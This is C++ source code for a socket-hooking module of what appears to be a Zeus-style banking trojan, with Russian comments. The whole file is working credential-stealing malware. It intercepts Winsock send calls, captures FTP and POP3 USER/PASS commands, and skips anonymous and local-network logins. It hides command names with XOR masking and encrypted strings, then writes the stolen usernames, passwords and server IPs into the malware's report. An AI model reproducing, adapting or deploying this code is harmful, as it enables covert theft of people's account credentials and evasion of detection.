#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "report.h"
#include "sockethook.h"
#include "cryptedstrings.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\wsocket.h"

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
////////////////////////////////////////////////////////////////////////////////////////////////////
// Переменные и функции для хранения промежуточных данных.
////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
  SOCKET socket;
  LPWSTR userName;
  LPWSTR pass;
}SOCKETDATA;

static SOCKETDATA *socketData;
static DWORD socketDataCount;
static CRITICAL_SECTION socketDataCs;

static SOCKETDATA *socketDataSearch(SOCKET s)
{
  for(DWORD i = 0; i < socketDataCount; i++)if(socketData[i].socket == s && socketData[i].socket != INVALID_SOCKET)return &socketData[i];
  return NULL;
}

static SOCKETDATA *socketDataCreate(SOCKET s)
{
  SOCKETDATA *sd = NULL;
  for(DWORD i = 0; i < socketDataCount; i++)if(socketData[i].socket == INVALID_SOCKET){sd = &socketData[i]; break;}
  if(sd == NULL && Mem::reallocEx(&socketData, sizeof(SOCKETDATA) * (socketDataCount + 1)))sd = &socketData[socketDataCount++];
  if(sd != NULL)sd->socket = s;
  return sd;
}

static void socketDataFree(SOCKETDATA *sd, bool freeOnly = false)
{
  sd->socket = INVALID_SOCKET;
  
  Mem::free(sd->userName);
  sd->userName = NULL;
  
  Mem::free(sd->pass);
  sd->pass = NULL;

  //Отпимизируем список.
  if(freeOnly == false)
  {
    DWORD newCount = socketDataCount;
    while(newCount > 0 && socketData[newCount - 1].socket == INVALID_SOCKET)newCount--;
    if(newCount != socketDataCount)
    {
      Mem::reallocEx(&socketData, sizeof(SOCKETDATA) * newCount);
      socketDataCount = newCount;
    }
  }
}

////////////////////////////////////////////////////////////////////////////////////////////////////
#define XOR_COMPARE(d, w) ((*((LPDWORD)(d)) ^ BO_CLIENT_VERSION) == ((w) ^ BO_CLIENT_VERSION)) //Просто крипт для слов.
 
static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize)
{
  if(socket == INVALID_SOCKET || data == NULL || dataSize > 512)return false;

  //Поиск имени, Поиск пароля
  if(dataSize > 6 && (XOR_COMPARE(data, 0x52455355/*USER*/) || XOR_COMPARE(data, 0x53534150/*PASS*/)) && data[4] == ' ')
  {
    LPSTR argOffset = (LPSTR)(data + 5);
    DWORD argSize   = dataSize - 5;
    LPWSTR argument;
    //LPSTR nextLine;
    WDEBUG3(WDDT_INFO, "USER/PASS, argOffset=%u, dataSize=%u, argSize=%u", 5, dataSize, argSize);
    
    //Выделаяем аргумент команды.
    {
      DWORD i = 0;
      for(; i < argSize; i++)
      {
        BYTE c = argOffset[i];
        if(c == '\r' || c == '\n')
        {
          //nextLine = &argOffset[i + 1];
          break;
        }
        if(c < 0x20)return false;
      }
      if(i == 0 || i == argSize || (argument = Str::_utf8ToUnicode(argOffset, i)) == NULL)return false;
      WDEBUG1(WDDT_INFO, "argument=%s", argument);
    }

    //Добавляем промежуточные данные.
    SOCKETDATA *sd;
    bool ok = false;

    CWA(kernel32, EnterCriticalSection)(&socketDataCs);
    if((sd = socketDataSearch(socket)) == NULL && (sd = socketDataCreate(socket)) == NULL)Mem::free(argument);
    else
    {
      ok = true;
      if(data[0] == 'U')
      {
        socketDataFree(sd, true); //Обнуляем данные.
        //Mem::free(sd->userName);
        sd->userName = argument;
      }
      else //if(data[0] == 'P')
      {
        Mem::free(sd->pass);
        sd->pass = argument;
      }
      sd->socket = socket;
    }
    CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
    
    //Рекрусия на следующие данные после \r\n.
    /*
    if(ok)
    {
      LPSTR dataEnd = data + dataSize;
      while(nextLine < dataEnd && (*nextLine == '\r' || *nextLine == '\n'))nextLine++;
      if(nextLine < dataEnd)ok = socketGrabber(socket, (LPBYTE)nextLine, (DWORD)(DWORD_PTR)(dataEnd - nextLine));
    }
    */
    return ok;
  }
  
  //Опеределение протокола.
  if(dataSize > 1)
  {
    bool ok = false;

    CWA(kernel32, EnterCriticalSection)(&socketDataCs);
    SOCKETDATA *sd = socketDataSearch(socket);
    if(sd != NULL)
    {
      if(sd->userName == NULL || sd->pass == NULL)socketDataFree(sd);
      else
      {
        BYTE protocolType      = 0;
        WCHAR protocolTypeStr[max(CryptedStrings::len_sockethook_report_prefix_ftp, CryptedStrings::len_sockethook_report_prefix_pop3)];

        //Опеределяем протокол.
        if(0){}
#       if(BO_SOCKET_FTP > 0)
        else if((dataSize >= 3 && (data[0] == 'C' || data[0] == 'P') && data[1] == 'W' && data[2] == 'D') ||
                (dataSize >= 4 && (XOR_COMPARE(data, 0x45505954/*TYPE*/) || XOR_COMPARE(data, 0x54414546/*FEAT*/) || XOR_COMPARE(data, 0x56534150/*PASV*/)))
               )
        {
          protocolType    = BLT_LOGIN_FTP;
          CryptedStrings::_getW(CryptedStrings::id_sockethook_report_prefix_ftp, protocolTypeStr);
        }
#       endif
#       if(BO_SOCKET_POP3 > 0)
        else if(dataSize >= 4 && (XOR_COMPARE(data, 0x54415453/*STAT*/) || XOR_COMPARE(data, 0x5453494C/*LIST*/)))
        {
          protocolType    = BLT_LOGIN_POP3;
          CryptedStrings::_getW(CryptedStrings::id_sockethook_report_prefix_pop3, protocolTypeStr);
        }
#       endif
        WDEBUG1(WDDT_INFO, "protocolType=%u", protocolType);

        if(protocolType != 0)
        {
          SOCKADDR_STORAGE sa;
          int size = sizeof(SOCKADDR_STORAGE);

          if(CWA(ws2_32, getpeername)(socket, (sockaddr *)&sa, &size) == 0 && !WSocket::_isLocalIp(&sa))
          {
            bool write = false;             

            if(0){}
#           if(BO_SOCKET_POP3 > 0)
            else if(protocolType == BLT_LOGIN_POP3)
            {
              write = true;
            }
#           endif
#           if(BO_SOCKET_FTP > 0)
            else if(protocolType == BLT_LOGIN_FTP)
            {
              CSTR_GETW(anonymous, sockethook_user_anonymous);
              if(Str::_CompareW(sd->userName, anonymous, -1, CryptedStrings::len_sockethook_user_anonymous - 1) != 0)write = true;
            }
#           endif

            if(write == true)
            {
              WCHAR ipAddress[MAX_PATH];
              WSocket::ipToStringW(&sa, ipAddress);
              CSTR_GETW(reportFormat, sockethook_report_format);
              Report::writeStringFormat(protocolType, NULL, NULL, reportFormat, protocolTypeStr, sd->userName, sd->pass, ipAddress);
            }
          }
          socketDataFree(sd);
        }
      }
    }
    CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
    
    return ok;
  }

  return false;
}

void SocketHook::init(void)
{
  socketData      = NULL;
  socketDataCount = 0;
  CWA(kernel32, InitializeCriticalSection)(&socketDataCs);
}

void SocketHook::uninit(void)
{
  for(DWORD i = 0; i < socketDataCount; i++)socketDataFree(&socketData[i], true);
  Mem::free(socketData);
  CWA(kernel32, DeleteCriticalSection)(&socketDataCs);
}

int WSAAPI SocketHook::hookerCloseSocket(SOCKET s)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
  
  if(Core::isActive())//Возможна небольшая утечка памяти.
  {
    CWA(kernel32, EnterCriticalSection)(&socketDataCs);
    SOCKETDATA *sd = socketDataSearch(s);
    if(sd)socketDataFree(sd);
    CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
  }

  return CWA(ws2_32, closesocket)(s);
}

int WSAAPI SocketHook::hookerSend(SOCKET s, const char *buf, int len, int flags)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
  if(Core::isActive())socketGrabber(s, (LPBYTE)buf, len);
  return CWA(ws2_32, send)(s, buf, len, flags);
}

int WSAAPI SocketHook::hookerWsaSend(SOCKET s, LPWSABUF buffers, DWORD bufferCount, LPDWORD numberOfBytesSent, DWORD flags, LPWSAOVERLAPPED overlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE completionRoutine)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
  if(Core::isActive())for(DWORD i = 0; i < bufferCount; i++)socketGrabber(s, (LPBYTE)buffers->buf, buffers->len);
  return WSASend(s, buffers, bufferCount, numberOfBytesSent, flags, overlapped, completionRoutine);
}
#endif
